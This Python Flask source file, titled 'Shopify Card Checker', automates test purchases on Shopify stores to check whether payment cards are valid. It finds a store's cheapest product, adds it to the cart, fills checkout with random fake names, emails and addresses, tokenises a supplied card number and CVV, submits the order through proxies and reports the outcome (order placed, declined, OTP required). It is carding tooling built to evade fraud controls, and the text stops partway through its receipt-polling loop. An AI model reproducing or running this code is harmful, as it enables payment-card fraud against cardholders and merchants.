"""
Shopify Card Checker — Flask API
Fixed version: GraphQL queries added, PORT dynamic, asyncio.run(),
SOCKS proxy support, fetch_products return-type unified.
"""

import asyncio
import json
import os
import random
import re
from urllib.parse import urlparse

import aiohttp
from flask import Flask, jsonify, request

# ── SOCKS proxy support (optional) ─────────────────────────────────────────
try:
    from aiohttp_socks import ProxyConnector
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False

# ═══════════════════════════════════════════════════════════════════════════
#  GraphQL Queries — Shopify Checkout Unstable API
# ═══════════════════════════════════════════════════════════════════════════

QUERY_PROPOSAL_SHIPPING = """
query Proposal(
  $sessionInput: SessionInput!
  $queueToken: String
  $discounts: DiscountsInput!
  $delivery: DeliveryInput!
  $deliveryExpectations: DeliveryExpectationsInput
  $merchandise: MerchandiseInput!
  $payment: PaymentInput!
  $buyerIdentity: BuyerIdentityInput!
  $tip: TipInput
  $taxes: TaxesInput
  $note: NoteInput
  $localizationExtension: LocalizationExtensionInput
  $nonNegotiableTerms: NonNegotiableTermsInput
  $scriptFingerprint: ScriptFingerprintInput
  $optionalDuties: OptionalDutiesInput
) {
  session(input: $sessionInput) {
    negotiate(
      input: {
        queueToken: $queueToken
        discounts: $discounts
        delivery: $delivery
        deliveryExpectations: $deliveryExpectations
        merchandise: $merchandise
        payment: $payment
        buyerIdentity: $buyerIdentity
        tip: $tip
        taxes: $taxes
        note: $note
        localizationExtension: $localizationExtension
        nonNegotiableTerms: $nonNegotiableTerms
        scriptFingerprint: $scriptFingerprint
        optionalDuties: $optionalDuties
      }
    ) {
      result {
        __typename
        ... on NegotiationResultAvailable {
          checkpointData
          sellerProposal {
            delivery {
              __typename
              ... on FilledDeliveryTerms {
                deliveryLines {
                  availableDeliveryStrategies {
                    handle
                    amount { value { amount currencyCode } }
                  }
                }
              }
            }
            runningTotal { value { amount currencyCode } }
            payment {
              __typename
              ... on FilledPaymentTerms {
                availablePaymentLines {
                  paymentMethod {
                    name
                    paymentMethodIdentifier
                    extensibilityDisplayName
                  }
                }
              }
            }
            tax {
              __typename
              ... on FilledTaxTerms {
                totalTaxAmount { value { amount currencyCode } }
              }
            }
          }
        }
        ... on CheckpointDenied  { __typename }
        ... on Throttled         { __typename }
        ... on NegotiationResultFailed { __typename }
      }
    }
  }
}
"""

QUERY_PROPOSAL_DELIVERY = QUERY_PROPOSAL_SHIPPING  # same query, different variables

MUTATION_SUBMIT = """
mutation SubmitForCompletion(
  $input: SubmitInput!
  $attemptToken: String!
  $metafields: [MetafieldInput!]
  $analytics: AnalyticsInput
) {
  submitForCompletion(
    input: $input
    attemptToken: $attemptToken
    metafields: $metafields
    analytics: $analytics
  ) {
    __typename
    ... on SubmitSuccess {
      receipt {
        __typename
        ... on ProcessedReceipt { id }
        ... on WaitingReceipt   { id }
        ... on ActionRequiredReceipt { id }
      }
    }
    ... on SubmittedForCompletion {
      receipt {
        __typename
        ... on ProcessedReceipt { id }
        ... on WaitingReceipt   { id }
      }
    }
    ... on SubmitAlreadyAccepted {
      receipt {
        __typename
        ... on ProcessedReceipt { id }
        ... on WaitingReceipt   { id }
      }
    }
    ... on SubmitFailed   { reason }
    ... on SubmitRejected {
      errors { code message }
    }
    ... on Throttled      { __typename }
  }
}
"""

QUERY_POLL = """
query PollForReceipt($receiptId: ID!, $sessionToken: String!) {
  receipt(id: $receiptId, sessionToken: $sessionToken) {
    __typename
    ... on ProcessedReceipt {
      id
      order { name }
    }
    ... on FailedReceipt {
      id
      processingError { code message }
    }
    ... on ActionRequiredReceipt {
      id
      action { __typename }
    }
    ... on ProcessingReceipt { id }
    ... on WaitingReceipt    { id }
  }
}
"""

# ═══════════════════════════════════════════════════════════════════════════
#  Address book
# ═══════════════════════════════════════════════════════════════════════════

C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN",
    "AED": "AE", "HKD": "HK", "GBP": "GB", "CHF": "CH",
}

book = {
    "US":      {"address1": "123 Main St",           "city": "New York",    "postalCode": "10080",   "zoneCode": "NY",  "countryCode": "US", "phone": "2194157586"},
    "CA":      {"address1": "88 Queen St W",          "city": "Toronto",    "postalCode": "M5J2J3",  "zoneCode": "ON",  "countryCode": "CA", "phone": "4165550198"},
    "GB":      {"address1": "221B Baker Street",      "city": "London",     "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN":      {"address1": "221B MG Road",           "city": "Mumbai",     "postalCode": "400001",  "zoneCode": "MH",  "countryCode": "IN", "phone": "9876543210"},
    "AE":      {"address1": "Burj Tower",             "city": "Dubai",      "postalCode": "",        "zoneCode": "DU",  "countryCode": "AE", "phone": "501234567"},
    "HK":      {"address1": "Nathan Road 88",         "city": "Kowloon",    "postalCode": "",        "zoneCode": "KL",  "countryCode": "HK", "phone": "55555555"},
    "CN":      {"address1": "8 Zhongguancun Street",  "city": "Beijing",    "postalCode": "100080",  "zoneCode": "BJ",  "countryCode": "CN", "phone": "1062512345"},
    "CH":      {"address1": "Gotthardstrasse 17",     "city": "Schweiz",    "postalCode": "6430",    "zoneCode": "SZ",  "countryCode": "CH", "phone": "445512345"},
    "AU":      {"address1": "1 Martin Place",         "city": "Sydney",     "postalCode": "2000",    "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DEFAULT": {"address1": "123 Main St",            "city": "New York",   "postalCode": "10080",   "zoneCode": "NY",  "countryCode": "US", "phone": "2194157586"},
}


def pick_addr(url, cc=None, rc=None):
    cc  = (cc  or "").upper()
    rc  = (rc  or "").upper()
    dom = urlparse(url).netloc
    tcn = dom.split(".")[-1].upper()
    if tcn in book:
        return book[tcn]
    ccn = C2C.get(cc)
    if rc in book and ccn == rc:
        return book[rc]
    elif rc in book:
        return book[rc]
    return book["DEFAULT"]


# ═══════════════════════════════════════════════════════════════════════════
#  Helpers
# ═══════════════════════════════════════════════════════════════════════════

def capture(data, first, last):
    try:
        start = data.index(first) + len(first)
        end   = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None


def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]:
                result = parts[1].split(end, 1)[0]
                return result if result else None
    except Exception:
        pass
    return None


class Utils:
    FIRST = ["James","John","Robert","Michael","William","David",
             "Mary","Patricia","Jennifer","Linda","Emily","Olivia"]
    LAST  = ["Smith","Johnson","Williams","Brown","Jones",
             "Garcia","Miller","Davis","Rodriguez","Wilson"]

    @staticmethod
    def get_random_name():
        return (random.choice(Utils.FIRST), random.choice(Utils.LAST))

    @staticmethod
    def generate_email(first, last):
        domains = ["gmail.com","yahoo.com","outlook.com","protonmail.com"]
        num = random.randint(1, 999)
        return f"{first.lower()}.{last.lower()}{num}@{random.choice(domains)}"


def parse_proxy(proxy_str: str):
    """
    Parses any proxy format and returns a URL string.
    Supports:
        host:port
        host:port:user:pass
        socks5://user:pass@host:port
        http://user:pass@host:port
    """
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    # Already a full URL
    if proxy_str.startswith(("http://", "https://", "socks4://", "socks5://")):
        return proxy_str
    parts = proxy_str.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    return None


def _build_connector(proxy_url: str):
    """
    Returns (connector, proxy_kwarg).
    SOCKS proxies need ProxyConnector; HTTP proxies use the proxy= kwarg.
    """
    if proxy_url and proxy_url.startswith(("socks4://", "socks5://")):
        if SOCKS_AVAILABLE:
            return ProxyConnector.from_url(proxy_url, ssl=False), None
        else:
            raise RuntimeError("aiohttp_socks not installed — cannot use SOCKS proxy")
    connector = aiohttp.TCPConnector(ssl=False)
    return connector, proxy_url  # pass proxy as kwarg to each request


def is_captcha_required(response_text):
    if not response_text:
        return False
    indicators = [
        "CAPTCHA_REQUIRED", '"code":"CAPTCHA_REQUIRED"',
        "captcha required", "CAPTCHA CHALLENGE", "hcaptcha", "h-captcha",
    ]
    text_upper = response_text.upper()
    return any(i.upper() in text_upper for i in indicators)


async def make_graphql_request_with_captcha_handling(
    session, graphql_url, params, headers, json_data,
    checkout_url, max_retries=1, solve_captcha=True, proxy=None
):
    for attempt in range(max_retries + 1):
        try:
            response = await session.post(
                graphql_url, params=params, headers=headers,
                json=json_data, proxy=proxy
            )
            response_text = await response.text()
            return response, response_text, False
        except Exception as e:
            if attempt == max_retries:
                return None, str(e), False
            await asyncio.sleep(1)
    return None, "max retries exceeded", False


async def fetch_products(domain, proxy_str=None):
    """
    Returns a dict on success, or (False, reason_str) on failure.
    Callers must check: if isinstance(result, tuple): ...
    """
    try:
        if not domain.startswith("http"):
            domain = "https://" + domain

        proxy_url  = parse_proxy(proxy_str) if proxy_str else None
        connector, proxy_kwarg = _build_connector(proxy_url) if proxy_url else (aiohttp.TCPConnector(ssl=False), None)
        timeout    = aiohttp.ClientTimeout(total=10)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get(
                f"{domain}/products.json",
                proxy=proxy_kwarg
            ) as resp:
                if resp.status != 200:
                    return False, f"<b>Site Error! Status: {resp.status}</b>"
                text = await resp.text()
                if "shopify" not in text.lower():
                    return False, "<b>Not a Shopify store!</b>"
                data = await resp.json()
                products = data.get("products", [])
                if not products:
                    return False, "<b>No Products found!</b>"

        min_price   = float("inf")
        min_product = None

        for product in products:
            for variant in product.get("variants", []):
                if not variant.get("available", True):
                    continue
                try:
                    price = float(str(variant.get("price", "0")).replace(",", ""))
                    if price < min_price:
                        min_price   = price
                        min_product = {
                            "site":       domain,
                            "price":      f"{price:.2f}",
                            "variant_id": str(variant["id"]),
                            "link":       f"{domain}/products/{product['handle']}",
                        }
                except (ValueError, TypeError, AttributeError):
                    continue

        if isinstance(min_product, dict) and min_product.get("variant_id"):
            return min_product            # ← dict on success
        return False, "<b>No valid products available</b>"

    except aiohttp.ClientError as e:
        return False, f"<b>Proxy/Network Error: {e}</b>"
    except Exception as e:
        return False, f"<b>Error: {e}</b>"


def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    message = str(message)
    patterns = [
        r"(PAYMENTS_[A-Z_]+)",
        r"(CARD_[A-Z_]+)",
        r"([A-Z]+_[A-Z]+_[A-Z_]+)",
        r"([A-Z]+_[A-Z_]+)",
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'{"code":"([^"]+)"',
        r"'code':'([^']+)'",
    ]
    for pattern in patterns:
        for match in re.findall(pattern, message, re.IGNORECASE):
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                return match.strip("{}:'\" ")
    words = message.split()
    if words and "_" in words[0] and words[0].isupper():
        return words[0]
    return message[:50]


# ═══════════════════════════════════════════════════════════════════════════
#  Core card processor
# ═══════════════════════════════════════════════════════════════════════════

async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    gateway         = "UNKNOWN"
    total_price     = "0.00"
    currency        = "USD"
    payment_identifier = None
    checkpoint_data = None
    running_total   = "0.00"
    final_text      = ""   # ← initialised so post-loop references are safe

    ourl  = site_url if site_url.startswith("http") else f"https://{site_url}"
    url   = ourl
    proxy_url = parse_proxy(proxy_str) if proxy_str else None

    try:
        connector, proxy_kwarg = _build_connector(proxy_url) if proxy_url else (aiohttp.TCPConnector(ssl=False), None)
        timeout = aiohttp.ClientTimeout(total=30)

        headers = {
            "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                               "AppleWebKit/537.36 (KHTML, like Gecko) "
                               "Chrome/124.0.0.0 Safari/537.36",
            "Accept":          "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type":    "application/json",
            "Origin":          ourl,
            "Referer":         ourl,
        }

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:

            # ── Step 1: Fetch variant_id if not provided ─────────────────
            if not variant_id:
                info = await fetch_products(ourl, proxy_str)
                if isinstance(info, tuple):          # (False, reason)
                    return False, info[1], gateway, total_price, currency
                variant_id = info["variant_id"]

            # ── Step 2: Add to cart ──────────────────────────────────────
            cart     = f"{ourl}/cart/add.js"
            checkout = f"{ourl}/checkout"

            cart_headers = {
                **headers,
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept":       "application/json, text/javascript",
            }
            cart_resp = await session.post(
                cart, data=f"id={variant_id}&quantity=1",
                headers=cart_headers, proxy=proxy_kwarg
            )
            if cart_resp.status != 200:
                cart_resp = await session.post(
                    cart,
                    json={"items": [{"id": int(variant_id), "quantity": 1}]},
                    headers={**headers, "Content-Type": "application/json"},
                    proxy=proxy_kwarg
                )
            if cart_resp.status != 200:
                return False, f"Cart failed with status {cart_resp.status}", gateway, total_price, currency

            # ── Step 3: Checkout page → session token ────────────────────
            response = await session.post(
                checkout, allow_redirects=True,
                headers={**headers, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
                proxy=proxy_kwarg
            )
            checkout_url = str(response.url)

            attempt_token_match = re.search(r"/checkouts/cn/([^/?]+)", checkout_url)
            attempt_token = (
                attempt_token_match.group(1)
                if attempt_token_match
                else checkout_url.split("/")[-1].split("?")[0]
            )

            sst  = (response.headers.get("X-Checkout-One-Session-Token") or
                    response.headers.get("x-checkout-one-session-token"))
            text = await response.text()

            if not sst:
                for start, end in [
                    ('name="serialized-sessionToken" content="&quot;', '&quot;'),
                    ('name="serialized-sessionToken" content="',       '"'),
                    ('"serializedSessionToken":"',                      '"'),
                    ('data-session-token="',                            '"'),
                    ('"sessionToken":"',                                '"'),
                ]:
                    sst = extract_between(text, start, end)
                    if sst:
                        break

            if "login" in checkout_url.lower():
                return False, "Site requires login!", gateway, total_price, currency

            if not sst:
                return False, "Failed to get session token", gateway, total_price, currency

            queueToken = (extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or
                          extract_between(text, '"queueToken":"', '"'))
            stableId   = (extract_between(text, 'stableId&quot;:&quot;', '&quot;') or
                          extract_between(text, '"stableId":"', '"'))

            merch = (extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"') or
                     extract_between(text, 'ProductVariantMerchandise/', '&quot;') or
                     str(variant_id))

            currency = "USD"
            if 'currencyCode&quot;:&quot;' in text:
                currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or "USD"
            elif '"currencyCode":"' in text:
                currency = extract_between(text, '"currencyCode":"', '"') or "USD"

            subtotal = (
                extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or
                extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            )
            if not subtotal:
                price_match = re.search(r'"price":\s*"([\d.]+)"', text)
                subtotal = price_match.group(1) if price_match else "0.01"

            # ── Step 4: Shipping proposal ────────────────────────────────
            addr = pick_addr(ourl)
            street     = addr["address1"]
            address2   = ""
            city       = addr["city"]
            s_zip      = addr["postalCode"]
            state      = addr["zoneCode"]
            country_code = addr["countryCode"]
            phone      = addr["phone"]

            firstName, lastName = Utils.get_random_name()
            email = Utils.generate_email(firstName, lastName)

            params_gql = {"operationName": "Proposal"}
            graphql_url = f"https://{urlparse(ourl).netloc}/checkouts/unstable/graphql"

            json_data = {
                "query": QUERY_PROPOSAL_SHIPPING,
                "variables": {
                    "sessionInput":       {"sessionToken": sst},
                    "queueToken":         queueToken or "",
                    "discounts":          {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "partialStreetAddress": {
                                    "address1": street, "address2": address2, "city": city,
                                    "countryCode": country_code, "postalCode": s_zip,
                                    "firstName": firstName, "lastName": lastName,
                                    "zoneCode": state, "phone": phone,
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True},
                                },
                                "options": {},
                            },
                            "targetMerchandiseLines": {"any": True},
                            "deliveryMethodTypes":    ["SHIPPING"],
                            "expectedTotalPrice":     {"any": True},
                            "destinationChanged":     True,
                        }],
                        "noDeliveryRequired":          [],
                        "useProgressiveRates":         False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping":       True,
                    },
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId":  stableId or "1",
                            "merchandise": {
                                "productVariantReference": {
                                    "id":        f"gid://shopify/ProductVariantMerchandise/{merch}",
                                    "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                    "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                                }
                            },
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                            "lineComponentsSource": None, "lineComponents": [],
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": "", "city": "", "countryCode": country_code,
                                "lastName": "", "zoneCode": "ENG", "phone": "",
                            }
                        },
                    },
                    "buyerIdentity": {
                        "customer":          {"presentmentCurrency": currency, "countryCode": country_code},
                        "email":             email,
                        "emailChanged":      False,
                        "phoneCountryCode":  country_code,
                        "marketingConsent":  [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country_code},
                        "rememberMe":        False,
                    },
                    "tip":   {"tipLines": []},
                    "taxes": {
                        "proposedAllocations":             None,
                        "proposedTotalAmount":             {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount":     None,
                        "proposedMixedStateTotalAmount":   None,
                        "proposedExemptions":              [],
                    },
                    "note":                  {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms":    None,
                    "scriptFingerprint": {
                        "signature": None, "signatureUuid": None,
                        "lineItemScriptChanges": [], "paymentScriptChanges": [],
                        "shippingScriptChanges": [],
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "operationName": "Proposal",
            }

            for i in range(2):
                response, resp_text, _ = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params_gql, headers, json_data,
                    checkout_url, max_retries=1, proxy=proxy_kwarg
                )
                if i == 0:
                    await asyncio.sleep(3)

            if not response:
                return False, f"Request failed: {resp_text}", gateway, total_price, currency
            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency

            try:
                resp_json = json.loads(resp_text)
            except json.JSONDecodeError as e:
                return False, f"Invalid JSON response: {e}", gateway, total_price, currency

            if "errors" in resp_json:
                errs = [e.get("message", str(e)) for e in resp_json["errors"][:3]]
                return False, f"GraphQL Error: {'; '.join(errs)}", gateway, total_price, currency

            try:
                if "data" not in resp_json:
                    return False, "No data in proposal response", gateway, total_price, currency
                session_data  = resp_json["data"].get("session")
                negotiate     = (session_data or {}).get("negotiate")
                result        = (negotiate or {}).get("result")
                if not result:
                    return False, "Negotiate returned null", gateway, total_price, currency

                result_type = result.get("__typename", "Unknown")
                if result_type == "CheckpointDenied":
                    return False, "Checkpoint Denied", gateway, total_price, currency
                if result_type == "Throttled":
                    return False, "Throttled", gateway, total_price, currency
                if result_type == "NegotiationResultFailed":
                    return False, "Negotiation failed", gateway, total_price, currency

                checkpoint_data = result.get("checkpointData")
                seller_proposal = result.get("sellerProposal")
                if not seller_proposal:
                    return False, "Seller proposal is null", gateway, total_price, currency

                delivery_data    = seller_proposal.get("delivery")
                running_total_d  = seller_proposal.get("runningTotal")
                if not running_total_d:
                    return False, "No runningTotal in sellerProposal", gateway, total_price, currency
                running_total = running_total_d["value"]["amount"]

            except (KeyError, TypeError) as e:
                return False, f"Failed to parse proposal response: {e}", gateway, total_price, currency

            # ── Delivery strategy ────────────────────────────────────────
            delivery_strategy = ""
            shipping_amount   = 0.0

            if delivery_data:
                dtype = delivery_data.get("__typename", "")
                if dtype == "FilledDeliveryTerms":
                    lines = delivery_data.get("deliveryLines", [{}])
                    if lines:
                        strategies = lines[0].get("availableDeliveryStrategies", [])
                        if strategies:
                            delivery_strategy = strategies[0].get("handle", "")
                            try:
                                shipping_amount = float(
                                    strategies[0].get("amount", {}).get("value", {}).get("amount", "0")
                                )
                            except (ValueError, TypeError):
                                shipping_amount = 0.0

            # ── Tax amount ───────────────────────────────────────────────
            tax_amount = 0.0
            try:
                tax_data = seller_proposal.get("tax", {})
                if tax_data and tax_data.get("__typename") == "FilledTaxTerms":
                    tax_amount = float(
                        tax_data.get("totalTaxAmount", {}).get("value", {}).get("amount", "0")
                    )
            except (ValueError, TypeError):
                tax_amount = 0.0

            # ── Payment method ───────────────────────────────────────────
            payment_data = seller_proposal.get("payment", {})
            if payment_data and payment_data.get("__typename") == "FilledPaymentTerms":
                for method in payment_data.get("availablePaymentLines", []):
                    pm = method.get("paymentMethod", {})
                    if pm.get("name") or pm.get("paymentMethodIdentifier"):
                        payment_identifier = pm.get("paymentMethodIdentifier")
                        gateway    = pm.get("extensibilityDisplayName") or pm.get("name", "UNKNOWN")
                        total_price = str(float(running_total) + shipping_amount + tax_amount)
                        break

            if not payment_identifier:
                return False, "No valid payment method found", gateway, total_price, currency

            # ── Step 5: Delivery proposal ────────────────────────────────
            json_data["query"] = QUERY_PROPOSAL_DELIVERY
            dl = json_data["variables"]["delivery"]["deliveryLines"][0]
            dl["selectedDeliveryStrategy"] = {
                "deliveryStrategyByHandle": {
                    "handle": delivery_strategy or "",
                    "customDeliveryRate": False,
                },
                "options": {},
            }
            dl["targetMerchandiseLines"] = {"lines": [{"stableId": stableId or "1"}]}
            dl["expectedTotalPrice"]     = {"value": {"amount": str(shipping_amount), "currencyCode": currency}}
            dl["destinationChanged"]     = False

            json_data["variables"]["payment"]["billingAddress"] = {
                "streetAddress": {
                    "address1": street, "address2": address2, "city": city,
                    "countryCode": country_code, "postalCode": s_zip,
                    "firstName": firstName, "lastName": lastName,
                    "zoneCode": state, "phone": phone,
                }
            }
            json_data["variables"]["taxes"]["proposedTotalAmount"]["value"]["amount"] = str(tax_amount)
            json_data["variables"]["buyerIdentity"]["shopPayOptInPhone"]["number"]    = phone

            response, resp_text, _ = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params_gql, headers, json_data,
                checkout_url, max_retries=1, proxy=proxy_kwarg
            )
            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED on delivery proposal", gateway, total_price, currency

            # ── Step 6: Tokenise card ────────────────────────────────────
            formattedCard = " ".join([cc[i:i+4] for i in range(0, len(cc), 4)])
            payload = {
                "credit_card": {
                    "month":              mes,
                    "name":               f"{firstName} {lastName}",
                    "number":             formattedCard,
                    "verification_value": cvv,
                    "year":               ano,
                    "start_month":  "", "start_year":  "", "issue_number": "",
                },
                "payment_session_scope": f"www.{urlparse(url).netloc}",
            }

            # ── FIX: deposit.shopifycs.com always via HTTP (no SOCKS) ────
            deposit_connector = aiohttp.TCPConnector(ssl=False)
            deposit_timeout   = aiohttp.ClientTimeout(total=15)
            async with aiohttp.ClientSession(connector=deposit_connector, timeout=deposit_timeout) as dep:
                dep_resp   = await dep.post("https://deposit.shopifycs.com/sessions", json=payload)
                token_data = await dep_resp.json()
                token      = token_data.get("id")
                if not token:
                    return False, "Unable to get payment token", gateway, total_price, currency

            # ── Step 7: Submit for completion ────────────────────────────
            params_sub = {"operationName": "SubmitForCompletion"}
            submit_variables = {
                "input": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken":   queueToken or "",
                    "discounts":    {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "streetAddress": {
                                    "address1": street, "address2": address2, "city": city,
                                    "countryCode": country_code, "postalCode": s_zip,
                                    "firstName": firstName, "lastName": lastName,
                                    "zoneCode": state, "phone": phone,
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyByHandle": {
                                    "handle": delivery_strategy or "",
                                    "customDeliveryRate": False,
                                },
                                "options": {"phone": phone},
                            },
                            "targetMerchandiseLines": {"lines": [{"stableId": stableId or "1"}]},
                            "deliveryMethodTypes":    ["SHIPPING"],
                            "expectedTotalPrice":     {"value": {"amount": str(shipping_amount), "currencyCode": currency}},
                            "destinationChanged":     False,
                        }],
                        "noDeliveryRequired":          [],
                        "useProgressiveRates":         True,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping":       True,
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stableId or "1",
                            "merchandise": {
                                "productVariantReference": {
                                    "id":        f"gid://shopify/ProductVariantMerchandise/{merch}",
                                    "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                    "properties": [], "sellingPlanId": None, "sellingPlanDigest": None,
                                }
                            },
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                            "lineComponentsSource": None, "lineComponents": [],
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": payment_identifier,
                                    "sessionId": token,
                                    "billingAddress": {
                                        "streetAddress": {
                                            "address1": street, "address2": address2,
                                            "city": city, "countryCode": country_code,
                                            "postalCode": s_zip, "firstName": firstName,
                                            "lastName": lastName, "zoneCode": state, "phone": phone,
                                        }
                                    },
                                    "cardSource": None,
                                }
                            },
                            "amount":  {"value": {"amount": running_total, "currencyCode": currency}},
                            "dueAt":   None,
                        }],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": street, "address2": address2, "city": city,
                                "countryCode": country_code, "postalCode": s_zip,
                                "firstName": firstName, "lastName": lastName,
                                "zoneCode": state, "phone": phone,
                            }
                        },
                    },
                    "buyerIdentity": {
                        "customer":          {"presentmentCurrency": currency, "countryCode": country_code},
                        "email":             email,
                        "emailChanged":      False,
                        "phoneCountryCode":  country_code,
                        "marketingConsent":  [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"number": phone, "countryCode": country_code},
                        "rememberMe":        False,
                    },
                    "taxes": {
                        "proposedAllocations":           None,
                        "proposedTotalAmount":           {"value": {"amount": str(tax_amount), "currencyCode": currency}},
                        "proposedTotalIncludedAmount":   None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions":            [],
                    },
                    "tip":                   {"tipLines": []},
                    "note":                  {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms":    None,
                    "optionalDuties":        {"buyerRefusesDuties": False},
                },
                "attemptToken": attempt_token,
                "metafields":   [],
                "analytics":    {"requestUrl": checkout_url},
            }
            if checkpoint_data:
                submit_variables["input"]["checkpointData"] = checkpoint_data

            submit_json = {
                "query":         MUTATION_SUBMIT,
                "variables":     submit_variables,
                "operationName": "SubmitForCompletion",
            }

            response, text, _ = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params_sub, headers, submit_json,
                checkout_url, max_retries=1, proxy=proxy_kwarg
            )

            if is_captcha_required(text):
                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency
            if "Your order total has changed." in text:
                return False, "Site not supported", gateway, total_price, currency
            if "The requested payment method is not available." in text:
                return False, "Payment method not available", gateway, total_price, currency

            rid = None
            try:
                resp_json   = json.loads(text)
                submit_data = resp_json.get("data", {}).get("submitForCompletion", {})

                if not submit_data:
                    errs = resp_json.get("errors", [])
                    if errs:
                        for err in errs:
                            code = err.get("code")
                            if code:
                                return False, code, gateway, total_price, currency
                    return False, "Empty submit response", gateway, total_price, currency

                result_type = submit_data.get("__typename", "")

                if result_type in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                    receipt = submit_data.get("receipt", {})
                    if receipt:
                        if receipt.get("__typename") == "ProcessedReceipt":
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        rid = receipt.get("id")
                    if not rid:
                        return False, "SubmitSuccess but no receipt ID", gateway, total_price, currency

                elif result_type == "SubmitFailed":
                    reason = submit_data.get("reason", "Unknown reason")
                    return False, extract_clean_response(reason), gateway, total_price, currency

                elif result_type == "SubmitRejected":
                    for err in submit_data.get("errors", []):
                        code = err.get("code")
                        if code:
                            return False, code, gateway, total_price, currency
                    return False, "Submit Rejected", gateway, total_price, currency

                elif result_type == "Throttled":
                    return False, "Throttled", gateway, total_price, currency

                else:
                    receipt = submit_data.get("receipt", {})
                    rid     = receipt.get("id") if receipt else None
                    if not rid:
                        return False, "No receipt ID in submit response", gateway, total_price, currency

            except json.JSONDecodeError:
                return False, f"Invalid JSON in submit response: {text[:100]}", gateway, total_price, currency
            except Exception as e:
                return False, f"Error parsing submit: {e}", gateway, total_price, currency

            # ── Step 8: Poll for receipt ─────────────────────────────────
            params_poll = {"operationName": "PollForReceipt"}
            poll_json   = {
                "query":         QUERY_POLL,
                "variables":     {"receiptId": rid, "sessionToken": sst},
                "operationName": "PollForReceipt",
            }

            await asyncio.sleep(3)

            for i in range(4):
                response, final_text, _ = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params_poll, headers, poll_json,
                    checkout_url, max_retries=1, proxy=proxy_kwarg
                )

                if is_captcha_required(final_text):
                    return True, "CARD_DECLINED", gateway, total_price, currency

                try:
                    pj           = json.loads(final_text)
                    receipt_data = pj.get("data", {}).get("receipt", {})

                    if receipt_data:
                        typename = receipt_data.get("__typename", "")
                        if typename == "ProcessedReceipt":
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif typename == "FailedReceipt":
                            code = receipt_data.get("processingError", {}).get("code", "UNKNOWN_ERROR")
                            return True, code, gateway, total_price, currency
                        elif typename == "ActionRequiredReceipt":
                            return True, "OTP_REQUIRED", gateway, total_price, currency
